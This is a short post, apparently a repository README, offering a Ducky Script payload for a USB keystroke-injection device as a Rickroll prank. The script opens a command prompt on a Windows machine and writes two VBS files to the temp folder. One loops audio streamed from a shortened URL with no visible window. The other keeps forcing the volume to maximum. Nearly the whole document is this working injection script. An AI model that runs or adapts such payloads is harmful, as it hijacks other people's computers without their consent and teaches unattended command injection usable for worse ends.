Based on: https://gitlab.com/WarKitteh/arduino-hid-rickroll

GitLab repo (Modded): https://github.com/BlueArduino20/Rickroll-MODDED

It creates and starts 2 vbs files. One of them plays Never Gonna Give You Up from Rick Astley on a loop without any windows showing up. Another vbs file sets the volume to the maximum continuously and if someone tries to get down the volume, it will reset the volume to the maximum level.

Ducky code:
```
DELAY 3500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING del %tmp%\rickyou.vbs
ENTER
DELAY 200
STRING del %tmp%\volup.vbs
ENTER
DELAY 200
STRING cd %tmp% && copy con rickyou.vbs
ENTER
STRING While true
ENTER
STRING Dim oPlayer
ENTER
STRING Set oPlayer = CreateObject("WMPlayer.OCX")
ENTER
STRING oPlayer.URL = "http://tinyurl.com/s63ve48"
ENTER
STRING oPlayer.controls.play
ENTER
STRING While oPlayer.playState <> 1 ' 1 = Stopped
ENTER
STRING WScript.Sleep 100
ENTER
STRING Wend
ENTER
STRING oPlayer.close
ENTER
STRING Wend
ENTER
DELAY 100
CTRL z
ENTER
STRING copy con volup.vbs
ENTER
STRING do
ENTER
STRING Set WshShell = CreateObject("WScript.Shell")
ENTER
STRING WshShell.SendKeys(chr(&hAF))
ENTER
STRING loop
ENTER
CTRL z
ENTER
STRING start rickyou.vbs && volup.vbs
ENTER
STRING exit
ENTER
```